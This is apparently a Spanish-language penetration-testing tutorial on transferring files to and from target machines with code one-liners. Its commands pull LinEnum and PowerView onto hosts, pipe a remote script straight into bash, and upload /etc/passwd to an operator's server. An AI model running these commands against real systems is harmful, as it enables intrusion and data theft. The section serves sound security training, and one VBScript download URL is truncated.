# Transferring Files with Code

Es común encontrar diferentes lenguajes de programación instalados en las máquinas que estamos atacando. Lenguajes de programación como Python, PHP, Perl y Ruby son comunes en distribuciones Linux, aunque también pueden estar instalados en Windows, aunque esto es mucho menos frecuente.

Podemos usar algunas aplicaciones predeterminadas de Windows, como `cscript` y `mshta`, para ejecutar código JavaScript o VBScript. JavaScript también se puede ejecutar en hosts Linux.

Según Wikipedia, existen alrededor de 700 lenguajes de programación, y podemos crear código en cualquiera de estos lenguajes para descargar, cargar o ejecutar instrucciones en el sistema operativo. Esta sección proporcionará algunos ejemplos usando lenguajes de programación comunes.

## **Python**

Python es un lenguaje de programación popular. Actualmente, se soporta la versión 3, pero es posible encontrar servidores donde aún exista Python versión 2.7. Python puede ejecutar "one-liners" desde la línea de comandos del sistema operativo usando la opción `-c`. Veamos algunos ejemplos:

### **Python 2 - Descargar archivo**

```bash
sherlock28@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### **Python 3 - Descargar archivo**

```bash
sherlock28@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## **PHP**

PHP también es muy prevalente y proporciona múltiples métodos para transferir archivos. Según los datos de W3Techs, PHP es utilizado por el 77.4% de todos los sitios web con un lenguaje de programación del lado del servidor conocido. Aunque la información no es precisa y el número puede ser ligeramente menor, a menudo encontraremos servicios web que usan PHP cuando realizamos una operación ofensiva.

Veamos algunos ejemplos de cómo descargar archivos usando PHP.

En el siguiente ejemplo, usaremos el módulo `file_get_contents()` de PHP para descargar contenido de un sitio web, combinado con el módulo `file_put_contents()` para guardar el archivo en un directorio. PHP se puede usar para ejecutar "one-liners" desde la línea de comandos del sistema operativo usando la opción `-r`.

### **PHP - Descargar archivo con `file_get_contents()`**

```bash
sherlock28@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

Una alternativa a `file_get_contents()` y `file_put_contents()` es el módulo `fopen()`. Podemos usar este módulo para abrir una URL, leer su contenido y guardarlo en un archivo.

### **PHP - Descargar archivo con `fopen()`**

```bash
sherlock28@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

También podemos enviar el contenido descargado a una tubería, de manera similar al ejemplo sin archivos que ejecutamos en la sección anterior usando `cURL` y `wget`.

### **PHP - Descargar un archivo y enviarlo a bash**

```bash
sherlock28@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

> **Nota**: La URL se puede usar como nombre de archivo con la función `@file` si los envoltorios de `fopen` han sido habilitados.

## Otros Lenguajes

Ruby y Perl son otros lenguajes populares que también se pueden usar para transferir archivos. Ambos lenguajes admiten la ejecución de "one-liners" desde la línea de comandos del sistema operativo usando la opción `-e`.

### **Ruby - Descargar un archivo**

```bash
sherlock28@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### **Perl - Descargar un archivo**

```bash
sherlock28@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript

JavaScript es un lenguaje de programación que permite implementar características complejas en páginas web. Como otros lenguajes, también se puede usar para varias tareas, incluyendo la descarga de archivos.

El siguiente código en JavaScript está basado en un post y se puede usar para descargar un archivo. Creamos un archivo llamado `wget.js` y guardamos el siguiente contenido:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Podemos ejecutar el siguiente comando desde un símbolo del sistema de Windows o terminal de PowerShell para ejecutar nuestro código JavaScript y descargar un archivo.

### **Descargar un archivo usando JavaScript y `cscript.exe`**

```bash
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript

VBScript ("Microsoft Visual Basic Scripting Edition") es un lenguaje de scripting desarrollado por Microsoft basado en Visual Basic. VBScript ha sido instalado por defecto en todas las versiones de escritorio de Microsoft Windows desde Windows 98.

El siguiente ejemplo en VBScript se puede utilizar para descargar un archivo. Creamos un archivo llamado `wget.vbs` y guardamos el siguiente contenido:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Podemos usar el siguiente comando desde un símbolo del sistema de Windows o terminal de PowerShell para ejecutar nuestro código VBScript y descargar un archivo.

### **Descargar un archivo usando VBScript y `cscript.exe`**

```bash
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/
```

## Operaciones de Carga utilizando Python3

Si queremos cargar un archivo, necesitamos entender las funciones de un lenguaje de programación específico para realizar esta operación. El módulo `requests` de Python3 permite enviar solicitudes HTTP (GET, POST, PUT, etc.) usando Python. Podemos utilizar el siguiente código si queremos cargar un archivo en nuestro servidor de carga Python3.

### **Iniciar el Módulo de Carga en Python**

```bash
sherlock28@htb[/htb]$ python3 -m uploadserver
```

```arduino
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### **Cargar un archivo usando un One-liner en Python**

```bash
sherlock28@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Vamos a dividir este one-liner en varias líneas para entender mejor cada parte.

```python
# Para usar la función requests, primero debemos importar el módulo.
import requests 

# Definir la URL de destino donde cargaremos el archivo.
URL = "http://192.168.49.128:8000/upload"

# Definir el archivo que queremos leer, abrirlo y guardarlo en una variable.
file = open("/etc/passwd", "rb")

# Usar una solicitud POST de requests para cargar el archivo.
r = requests.post(URL, files={"files": file})
```

Podemos hacer lo mismo con cualquier otro lenguaje de programación. Una buena práctica es elegir uno e intentar crear un programa de carga.

## Recapitulación de la Sección

Entender cómo podemos usar código para descargar y cargar archivos puede ayudarnos a alcanzar nuestros objetivos durante un ejercicio de red team, una prueba de penetración, una competencia CTF, un ejercicio de respuesta a incidentes, una investigación forense o incluso en nuestro trabajo diario como administradores de sistemas.
